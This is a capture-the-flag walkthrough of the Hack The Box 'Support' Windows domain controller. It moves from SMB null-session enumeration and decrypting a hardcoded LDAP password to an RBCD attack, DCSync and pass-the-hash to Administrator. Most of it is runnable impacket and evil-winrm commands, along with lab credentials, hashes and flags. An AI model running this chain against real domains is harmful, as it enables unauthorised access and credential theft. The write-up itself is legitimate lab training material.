# HTB Support - Easy Windows (AD) - Walkthrough

**IP:** 10.129.14.164  
**OS:** Windows Server 2022 (DC)  
**Difficulty:** Easy  
**Date:** 2026-06-07  
**Flags:**
- user.txt: `51c32dce96500b104cfd949a61b4b0ff`
- root.txt: `81eb4114a10cd73dd2356415218d85d4`

---

## 1. Recon

```
/etc/hosts: 10.129.14.164  support.htb dc.support.htb
```

**SMB null session:**
```bash
smbclient -L //10.129.14.164 -N
```
Non-standard share: **`support-tools`** - "support staff tools"

**Shares:** ADMIN$, C$, IPC$, NETLOGON, SYSVOL, `support-tools`

---

## 2. Foothold - .NET Binary with Hardcoded Encrypted LDAP Password

List `support-tools`:
```
7-ZipPortable_21.07.paf.exe
npp.8.4.1.portable.x64.zip
putty.exe
SysinternalsSuite.zip
UserInfo.exe.zip    ← custom tool, added later
windirstat1_1_2_setup.exe
WiresharkPortable64_3.6.5.paf.exe
```

`UserInfo.exe.zip` is the only non-standard item. Download and decompile:

```bash
smbclient //10.129.14.164/support-tools -N -c "get UserInfo.exe.zip"
unzip UserInfo.exe.zip -d UserInfo/
dotnet tool install ilspycmd -g
~/.dotnet/tools/ilspycmd UserInfo.exe
```

Decompiled source reveals:
```csharp
private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
private static byte[] key = Encoding.ASCII.GetBytes("armando");

public static string getPassword()
{
    byte[] array = Convert.FromBase64String(enc_password);
    for (int i = 0; i < array.Length; i++)
        array[i] = (byte)((array[i] ^ key[i % key.Length]) ^ 0xDF);
    return Encoding.Default.GetString(array);
}
```

And it connects as: `LDAP://support.htb` with `support\ldap`.

**Decrypt the password:**
```python
import base64
enc = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = b"armando"
data = base64.b64decode(enc)
print(bytes([(b ^ key[i % len(key)] ^ 0xDF) for i,b in enumerate(data)]).decode())
# → nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

**Creds: `ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`**

---

## 3. LDAP Enumeration → Cleartext Password

```bash
ldapsearch -H ldap://10.129.14.164 -D "support\ldap" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  -b "DC=support,DC=htb" "(objectClass=user)" sAMAccountName description info
```

Key finding:
```
sAMAccountName: support
info: Ironside47pleasure40Watchful
```

**Creds: `support:Ironside47pleasure40Watchful`** - WinRM access confirmed.

```bash
netexec winrm 10.129.14.164 -u support -p 'Ironside47pleasure40Watchful' -d support.htb
# [+] (Pwn3d!)
evil-winrm -i 10.129.14.164 -u support -p 'Ironside47pleasure40Watchful'
```

**user.txt:** `51c32dce96500b104cfd949a61b4b0ff`

---

## 4. Privesc - RBCD via GenericAll on DC$

**BloodHound collection:**
```bash
bloodhound-python -c ALL -u support -p 'Ironside47pleasure40Watchful' \
  -d support.htb -dc dc.support.htb -ns 10.129.14.164 --zip
```

**Finding:** `Shared Support Accounts` (support's group, SID -1103) has **GenericAll** over `DC.SUPPORT.HTB`.

GenericAll on a computer = can set `msDS-AllowedToActOnBehalfOfOtherIdentity` → RBCD.

**Attack: Resource-Based Constrained Delegation**

```bash
# 1. Add a fake computer account
impacket-addcomputer 'support.htb/support:Ironside47pleasure40Watchful' \
  -computer-name 'FAKEBOX$' -computer-pass 'FakePass123!' -dc-ip 10.129.14.164

# 2. Configure RBCD: FAKEBOX$ can impersonate on DC$
impacket-rbcd 'support.htb/support:Ironside47pleasure40Watchful' \
  -delegate-from 'FAKEBOX$' -delegate-to 'DC$' -dc-ip 10.129.14.164 -action write

# 3. Get service ticket as Administrator via S4U
impacket-getST 'support.htb/FAKEBOX$:FakePass123!' \
  -spn 'cifs/dc.support.htb' -impersonate Administrator -dc-ip 10.129.14.164

# 4. DCSync with the ticket
export KRB5CCNAME=Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
impacket-secretsdump -k -no-pass dc.support.htb -just-dc-user Administrator
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:bb06cbc02b39abeddd1335bc30b19e26:::

# 5. Pass-the-hash
evil-winrm -i 10.129.14.164 -u Administrator -H bb06cbc02b39abeddd1335bc30b19e26
```

**root.txt:** `81eb4114a10cd73dd2356415218d85d4`

---

## Chain Summary

```
SMB null session → support-tools share → UserInfo.exe
→ .NET decompile (ilspycmd) → XOR decrypt → ldap creds
→ LDAP dump → support user has cleartext in info field → WinRM
→ BloodHound → Shared Support Accounts has GenericAll on DC$
→ RBCD (addcomputer → rbcd → getST → secretsdump) → Administrator hash
→ PTH → root
```

---

## Key Techniques

- **SMB null session** to enumerate shares - always try `-N` first
- **.NET reverse engineering**: `ilspycmd` decompiles to readable C#; look for hardcoded creds, XOR/AES decryption routines, LDAP connection strings
- **LDAP `info` field**: plaintext passwords are commonly hidden in `description` or `info` user attributes - always dump these
- **GenericAll on computer object** → RBCD is the standard path (no ADCS required)
